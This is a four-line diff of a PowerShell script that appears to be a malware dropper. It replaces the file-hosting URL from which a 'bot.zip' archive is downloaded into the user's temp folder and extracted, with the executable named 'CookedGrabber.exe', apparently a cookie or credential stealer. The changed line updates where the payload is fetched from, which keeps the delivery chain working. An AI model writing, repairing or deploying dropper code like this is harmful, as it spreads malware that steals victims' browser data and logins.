@@ -1,4 +1,4 @@
-$zipUrl = "https://store-eu-par-3.gofile.io/download/web/9ce7760f-8dde-4764-afef-2dac1a25933c/bot.zip"
+$zipUrl = "https://phs8.krakencloud.net/force-download/YTVlZDUyNmFjMjM0ODljMEdJkIYYNXKlh90AQUmTDQePnkgZwCY0DknElozHjF3N/nhRWBTtepD"
 $zipPath = "$env:TEMP\bot.zip"
 $extractPath = "$env:TEMP\cikartilan"
 $exeName = "CookedGrabber.exe"
